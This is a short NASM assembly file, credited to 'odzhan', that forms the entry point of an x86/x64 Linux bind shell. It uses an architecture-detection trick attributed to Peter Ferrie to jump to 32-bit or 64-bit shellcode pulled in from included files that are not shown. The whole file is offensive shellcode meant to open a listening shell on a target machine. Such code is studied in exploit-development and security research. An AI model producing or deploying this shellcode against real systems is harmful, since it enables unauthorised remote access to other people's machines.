

; x86/x64 bind shell for linux
; odzhan

    bits 32

    ; method by peter ferrie for detecting 64-bit os
    xor    eax, eax
    inc    eax
    jz     x64
    
%include "bs32.asm"

    push   1                 ; sys_exit
    pop    eax
    int    0x80
x64:

%include "bs64.asm"
